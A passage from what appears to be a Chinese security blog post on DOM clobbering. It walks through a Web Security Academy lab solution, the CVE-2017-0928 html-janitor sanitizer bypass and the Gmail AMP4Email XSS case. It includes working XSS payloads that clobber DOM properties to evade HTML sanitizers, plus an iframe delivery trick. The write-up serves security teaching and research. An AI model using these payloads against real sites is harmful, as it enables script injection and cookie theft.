，我们可以看到我们使用<code>name=attributes</code>成功地覆盖了原来的<code>node.attributes</code>，所以<code>node.attributes.length</code>在这里的值为<code>undefined</code>，并且也没有影响 JS 代码的继续运行。</p><p>所以明白了这个简单的例子，我们可以构造一个包含有<code>name=attributes</code>的子节点的 payload 绕过属性的 check ，这里给定的白名单标签也比较明显，我们可以通过 HTML Relationships 来构造我们的 payload</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>接着就是构造 XSS 了，根据题目要求，需要用户访问触发，所以我们可以利用<code>tabindex</code>属性，配合<code>form</code>的<code>onfocus</code>时间来 XSS 。</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>把它当作评论提交</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png" alt=""></p><p>但是如果直接交给用户点击的话是不会触发的，因为评论是由 aJax 请求拿到的，直接访问的话，Dom 树是还没有评论的，得需要等待 JS 执行完成才会有评论，所以这里我们需要一个延时或者阻塞的操作。比较简单的是利用<code>iframe</code>进行<code>setTimeout</code></p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">https://your-lab-id.web-security-academy.net/post?postId</span>=<span class="hljs-string">3</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"setTimeout(a=&gt;this.src=this.src+'#x',500)"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里要注意一定要得等评论加载完毕再用<code>#x</code>选择<code>form</code>，所以这里的 500ms 需要根据自己的网络情况适当调整。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png" alt=""></p><h3 id="CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering"><a href="#CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering" class="headerlink" title="CVE-2017-0928 Bypassing sanitization using DOM clobbering"></a>CVE-2017-0928 Bypassing sanitization using DOM clobbering</h3><p><a href="https://github.com/guardian/html-janitor/" target="_blank" rel="noopener">html-janitor</a> 也就是我们上文用到的 HTML filters，在 v2.0.2 当中，janitor 在循环中有这么几行代码：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">do</span> {</span><br><span class="line">  <span class="hljs-comment">// Ignore nodes that have already been sanitized</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (node._sanitized) {</span><br><span class="line">    <span class="hljs-keyword">continue</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">  <span class="hljs-comment">// Sanitize children</span></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(node);</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-comment">// Mark node as sanitized so it's ignored in future runs</span></span><br><span class="line">  node._sanitized = <span class="hljs-literal">true</span>;</span><br><span class="line">} <span class="hljs-keyword">while</span> ((node = treeWalker.nextSibling()));</span><br></pre></td></tr></tbody></table></figure><p></p><p>用<code>_sanitized</code>作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的 payload 绕过第一个 if 就可以绕过标准化过滤了。</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(document.domain)</span> <span class="hljs-attr">name</span>=<span class="hljs-string">_sanitized</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。</p><h3 id="XSS-in-GMail’s-AMP4Email-via-DOM-Clobbering"><a href="#XSS-in-GMail’s-AMP4Email-via-DOM-Clobbering" class="headerlink" title="XSS in GMail’s AMP4Email via DOM Clobbering"></a>XSS in GMail’s AMP4Email via DOM Clobbering</h3><p>终于到了我们开头提到的 OWASP Top 10 提名的攻击实例了，作者首先通过直接在控制台输入 window 进行 fuzz</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png" alt=""></p><p>这里他首先利用了<code>AMP</code>，尝试插入<code>&lt;a id=AMP&gt;</code>，但是这个<code>AMP</code>被 ban 了</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png" alt=""></p><p>接着找到下一个<code>AMP_MODE</code>，这个没有被 ban ，反而让作者发现了这里加载失败的 URL 当中有一个<code>undefined</code></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png" alt=""></p><p>这就是作者插入了<code>&lt;a id=AMP_MODE&gt;</code>导致产生的<code>undefined</code>，主要产生这个问题的代码经作者简化后是这样的：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">"script"</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> loc;</span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.test &amp;&amp; <span class="hljs-built_in">window</span>.testLocation) {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.testLocation</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.location;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.localDev) {</span><br><span class="line">    loc = loc.protocol + <span class="hljs-string">"//"</span> + loc.host + <span class="hljs-string">"/dist"</span></span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-string">"https://cdn.ampproject.org"</span>;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">"/"</span> : <span class="hljs-string">""</span>;</span><br><span class="line">b.src = loc + <span class="hljs-string">"/rtv/"</span> + AMP_MODE.rtvVersion; + <span class="hljs-string">"/"</span> + singlePass + <span class="hljs-string">"v0/"</span> + pluginName + <span class="hljs-string">".js"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></tbody></table></figure><p></p><p>代码比较简单，如果再要简化到核心代码就是：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">"script"</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line">b.src = <span class="hljs-built_in">window</span>.testLocation.protocol + <span class="hljs-string">"//"</span> +</span><br><span class="line">        <span class="hljs-built_in">window</span>.testLocation.host + <span class="hljs-string">"/dist/rtv/"</span> +</span><br><span class="line">        AMP_MODE.rtvVersion; + <span class="hljs-string">"/"</span> +</span><br><span class="line">        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">"/"</span> : <span class="hljs-string">""</span>) +</span><br><span class="line">        <span class="hljs-string">"v0/"</span> + pluginName + <span class="hljs-string">".js"</span>;</span><br><span class="line"> </span><br><span class="line"><span 